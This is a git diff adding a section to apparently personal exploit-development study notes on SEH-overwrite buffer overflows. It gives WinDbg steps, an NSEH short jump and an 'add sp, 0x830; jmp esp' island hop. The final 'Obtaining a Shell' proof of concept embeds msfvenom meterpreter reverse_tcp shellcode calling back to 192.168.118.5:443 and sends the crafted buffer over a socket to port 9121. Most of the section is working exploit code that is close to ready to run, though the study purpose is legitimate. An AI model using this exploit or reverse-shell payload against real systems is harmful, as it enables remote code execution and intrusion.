@@ -170,6 +170,126 @@ inputBuffer += pack("<L" , (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax ; pop ebx 
 inputBuffer += b"\x43" * (size - len(inputBuffer))
 ```
 ### if a jump is needed
+```
+u eip
+dds esp
+```
+If a small jump is needed to escape some junk code like `lock ...` (causing access violation), assembl the instruction from the current place of the assembly
+```
+a
+jmp 0x018fff5c
+u eip L1 # this will give the opcode
+```
+The upcode will be addes for the NSEH before the SEH handler
+The new pow becomes 
+```
+try:
+    server = sys.argv[1]
+    port = 9121
+    size = 1000
+
+    inputBuffer = b"\x41" * 124 # (offset - 4)
+    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
+    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+    inputBuffer+= b"\x42" * (size - len(inputBuffer))
+```
+
+The shellcode is not fully taken after the SEH handler ? Check if **all** the shellcode is appearing and which part is taken 
+```
+dd eip L30
+!teb # and compare the Stack base with the first eip address
+```
+If not, search the stack and see if we can find all the shellcode (with dummy and unique value for search: here will be ... 90 90 90 90 41 41 41 41 ...)
+
+The new pow
+```
+try:
+    server = sys.argv[1]
+    port = 9121
+    size = 1000
+
+    shellcode = b"\x43" * 400
+    inputBuffer = b"\x41" * 124
+    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
+    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode)) #the most important part
+    inputBuffer+= shellcode
+```
+We can perform a search for the NOP instructions followed by the bytes contained in our shellcode variable **right after taking our short jump of NSEH (0x06eb9090)**
+
+```
+!teb
+s -b 01aee000 01af0000 90 90 90 90 43 43 43 43 43 43 43 43 # 01aee000 being the stacklimit printed by teb and 01af0000 the stackbase
+
+dd 01aefc70 L65 #01aefc70 being the result of the search
+```
+
+The next step is to determine the offset from the current stack pointer to the beginning of the shellcode. This will allow us to use the limited space we have to assemble a set of instructions that will allow us to "island hop", redirecting execution to our shellcode.
+```
+? 01aefc74 - @esp # 01aefc70 is the address from which the 43 43 43 43 is stating 
+# the result of this operation will be in hex
+```
+let's assemble a few instructions to increase the stack pointer by 0x830 bytes followed by a "jmp esp" to jump to the shellcode next.
+```
+kali@kali:~$ msf-nasm_shell
+nasm > add sp, 0x830 # 830 being the result of the previous operation; make sure there is no null bytes
+nasm > jmp esp
+```
+Update the pow to include the ADD assembly instruction, followed by a "jmp esp" to redirect the execution flow to the shellcode
+```
+try:
+    server = sys.argv[1]
+    port = 9121
+    size = 1000
+
+    shellcode = b"\x90" * 8
+    shellcode+= b"\x43" * (400 - len(shellcode))
+
+    inputBuffer = b"\x41" * 124
+    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH) 
+    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+    inputBuffer+= b"\x90" * 2
+    inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830
+    inputBuffer+= b"\xff\xe4" # jmp esp
+    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
+    inputBuffer+= shellcode
+```
+
+### Obtaining a Shell
+```
+try:
+    server = sys.argv[1]
+    port = 9121
+    size = 1000
+    # msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.118.5 LPORT=443 -b "\x00\x02\x0A\x0D\xF8\xFD" -f python -v shellcode
+    shellcode = b"\x90" * 20
+    shellcode += b""
+    shellcode += b"\xdb\xdd\xb8\xb3\xe9\xc8\x0b\xd9\x74\x24\xf4"
+    ...
+    shellcode += b"\xc8\xed\x4c\x07\x0f\x2e\xeb\x18\x3a\x13\x5a"
+    shellcode+= b"\x43" * (400 - len(shellcode))
+    inputBuffer = b"\x41" * 124
+    inputBuffer+= pack("<L", (0x06eb9090)) # (NSEH)
+    inputBuffer+= pack("<L", (0x1015a2f0)) # (SEH) 0x1015a2f0 - pop eax; pop ebx; ret
+    inputBuffer+= b"\x90" * 2
+    inputBuffer+= b"\x66\x81\xc4\x30\x08" # add sp, 0x830
+    inputBuffer+= b"\xff\xe4" # jmp esp
+    inputBuffer+= b"\x90" * (size - len(inputBuffer) - len(shellcode))
+    inputBuffer+= shellcode
+
+    header = b"\x75\x19\xba\xab"
+    header += b"\x03\x00\x00\x00"
+    header += b"\x00\x40\x00\x00"
+    header += pack('<I', len(inputBuffer))
+    header += pack('<I', len(inputBuffer))
+    header += pack('<I', inputBuffer[-1])
+    buf = header + inputBuffer
+    print("Sending evil buffer...")
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((server, port))
+    s.send(buf)
+    s.close()
+```
 
 ## Short/Long jump to shellcode
 The full shellcode may not be located at the begenning of the stack, so you should search it address in the stack
